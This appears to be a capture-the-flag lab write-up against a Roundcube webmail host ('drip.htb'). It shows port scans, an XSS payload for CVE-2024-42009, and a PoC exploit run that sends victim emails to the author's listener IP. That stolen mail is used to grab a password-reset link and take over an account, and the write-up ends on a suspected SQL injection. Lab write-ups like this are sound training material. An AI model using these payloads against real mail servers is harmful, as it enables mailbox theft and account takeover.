# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.232.7
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:07 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

## Nmap
```python
nmap -p 22,80 -A --min-rate=2000 -sT 10.129.232.7    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:09 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# SSH (22)
## Auth method
```python
ssh root@10.129.232.7                                     
The authenticity of host '10.129.232.7 (10.129.232.7)' can't be established.
ED25519 key fingerprint is: SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.7' (ED25519) to the list of known hosts.
root@10.129.232.7's password:
```

Password based auth

# HTTP (80)

The website points at the domain `drip.htb`

![](Pasted%20image%2020260904171628.png)

The sign in link takes me to `mail.drip.htb`

![](Pasted%20image%2020260904172715.png)



![1049](Pasted%20image%2020260904172910.png)

There is also a register function on the page

Just as i thought registering an accout allows me to logon to the dripmail instance

![](Pasted%20image%2020260904173332.png)

I am now logged in 

![](Pasted%20image%2020260904173358.png)

Found the version info 

![](Pasted%20image%2020260904173820.png)

Also found a potential user

This version of several different CVEs

# CVE-2024-42009

https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

https://medium.com/@zaid.zrf/practical-exploitation-of-cve-2024-42009-using-docker-and-swaks-124ac0bad911

https://algora.io/claims/28piVn5uYiQzf8b4

https://github.com/DaniTheHack3r/CVE-2024-42009-PoC?utm_source=chatgpt.com

I can use the contact form on the `http://drip.htb` page to send the email, interestingly if i proxy the request it lets me change the recipient, so ill create a victim account and begin trying the some payloads and testing them there

![](Pasted%20image%2020260904183549.png)

```python
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(1) foo=bar">Foo</body>
```

Ive sent a simple alert payload, to the victim user and it mentions another user `bcase@drip.htb` 

https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py

Ill try this POC script

```python
python3 exploit.py -fu ethan@drip.htb -tu bcase@drip.htb -u http://drip.htb/contact -ip 10.10.14.61 -p 80
[*] CVE-2024-42009 PoC: Listening on 10.10.14.61:80...


[+] Captured Email Content:
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

[+] Captured Email Content:
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks

[+] Captured Email Content:

^C
[!] Stopping...
```

As seen here it allows me to exfil the users emails. It gives me info on another subdomain

# `dev-a3f1-01` subdomain

![785](Pasted%20image%2020260904184544.png)

The leaked email tells me ill  have to reset my password before logging in!

![790](Pasted%20image%2020260904184807.png)

Ill use the forgot password feature and send an email to bcase which i can then leak that email once again

![](Pasted%20image%2020260904185010.png)

Ive sent the reset request and using the POC i can dump the link

Using this link i can reset the password for `bcase`, ive changed the password to `password`

`bcase:password` gets me access to the dashboard

![](Pasted%20image%2020260904185431.png)

There is an analytics dashboard which i can use to see the other users

![](Pasted%20image%2020260904185545.png)

Using a `'` in the search function on the analytics endpoint i get a SQL error, this is likely vulnerable to SQL injection

